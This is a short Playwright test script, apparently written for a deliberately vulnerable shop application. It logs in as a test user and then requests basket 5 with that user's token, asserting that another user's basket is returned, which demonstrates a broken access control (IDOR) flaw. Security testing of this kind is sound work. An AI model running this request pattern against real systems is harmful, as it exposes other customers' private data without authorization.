import { test, expect } from '@playwright/test';

test('Broken Access Control - View another user basket', async ({ request }) => {
 // Login
  const loginResponse = await request.post('/rest/user/login', {
    data: {
      email: process.env.TEST_USER_EMAIL,
      password: process.env.TEST_USER_PASSWORD,
    },
  });

  expect(loginResponse.status()).toBe(200);

  const loginBody = await loginResponse.json();
  const token = loginBody.authentication.token;

  // Access another user's basket
  const basketResponse = await request.get('/rest/basket/5', {
    headers: {
      Authorization: `Bearer ${token}`,
    },
  });

  expect(basketResponse.status()).toBe(200);

  const basketBody = await basketResponse.json();

  expect(basketBody.data.id).toBe(5);
  expect(basketBody.data.UserId).not.toBe(loginBody.authentication.bid);
});